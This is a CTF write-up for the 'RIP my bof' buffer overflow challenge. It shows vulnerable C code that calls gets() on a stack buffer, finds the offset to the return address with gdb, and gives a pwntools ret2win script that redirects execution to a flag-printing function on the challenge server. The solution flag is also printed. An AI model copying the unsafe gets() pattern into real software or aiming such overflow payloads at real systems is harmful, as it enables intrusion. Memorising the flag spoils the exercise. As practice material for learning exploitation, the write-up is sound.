# RIP my bof
#### Write-up author: [jon-brandy](https://github.com/jon-brandy)
## DESCRIPTION:
Okay so we have a bof, can we get it to redirect IP (instruction pointer) to something else?

If you get stuck liveoverflow covers you again!

`nc thekidofarcrania.com 4902`

[FILE](https://github.com/Bread-Yolk/ctflearnwu/blob/d5bb9a4c2cc44ed64ad2ad4b3c68fa1e986a50b9/Assets/Binex/RIP%20my%20bof/simple-rip.tar.gz)
## HINT:
- NONE
## STEPS:
1. First, download the file given.
2. Next, extract the `tar.gz` file.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/194563091-5297e2f5-e98a-42c4-acee-113568676149.png)


3. Go to the extracted folder.
4. Let's run the **server** file.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/194563320-7a0be066-b7e0-4bb5-87be-74131024d127.png)


5. Let's input any length of A's.

![image](https://user-images.githubusercontent.com/70703371/194563423-6933d1a4-e7d1-47c4-a1da-0806135489bc.png)


6. Let's analyze the source code.

> BOF2.C

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Defined in a separate source file for simplicity.
void init_visualize(char* buff);
void visualize(char* buff);

void win() {
  system("/bin/cat /flag.txt");
}

void vuln() {
  char padding[16];
  char buff[32];

  memset(buff, 0, sizeof(buff)); // Zero-out the buffer.
  memset(padding, 0xFF, sizeof(padding)); // Mark the padding with 0xff.

  // Initializes the stack visualization. Don't worry about it!
  init_visualize(buff); 

  // Prints out the stack before modification
  visualize(buff);

  printf("Input some text: ");
  gets(buff); // This is a vulnerable call!

  // Prints out the stack after modification
  visualize(buff); 
}

int main() {
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  vuln();
}

```

7. Actually based from the program output we can conclude that we must add padding bytes until we met the first byte of the **win**'s address.

![image](https://user-images.githubusercontent.com/70703371/194566229-afd76386-7b1d-473e-986a-9c4fdfcbe47c.png)



8. To make sure it's the correct address, let's run gdb then input `info address win`.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/194566395-03d478de-b300-4b0b-aab1-23073dfe8f0d.png)


9. Now let's run the file again and add padding until we met the first byte of **win**.


![image](https://user-images.githubusercontent.com/70703371/194566631-a8f2560e-a4bf-4ae4-8536-9b66e8111c8a.png)


10. Great! Now we know that the correct padding is 60 bytes.
11. Now we can control the return address.
12. However i found this challenge has similiarities with `ret2win` concept.
13. For this solution i made this python script:

```py
import os
from pwn import *

os.system('cls')
addrWin = 0x8048586 # the win function's address
sh = remote('thekidofarcrania.com', 4902)
p = b'A' * 60 # padding
p += p64(134514054) ## Decimal value of win`s offset

sh.recvuntil("text: ")
sh.sendline(p)

sh.interactive()
```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/194567283-70de1ee8-2076-459e-b9ff-2a73ebd5fe18.png)



14. Finally! We got the flag.


## FLAG

```
CTFlearn{c0ntr0ling_r1p_1s_n0t_t00_h4rd_abjkdlfa}
```


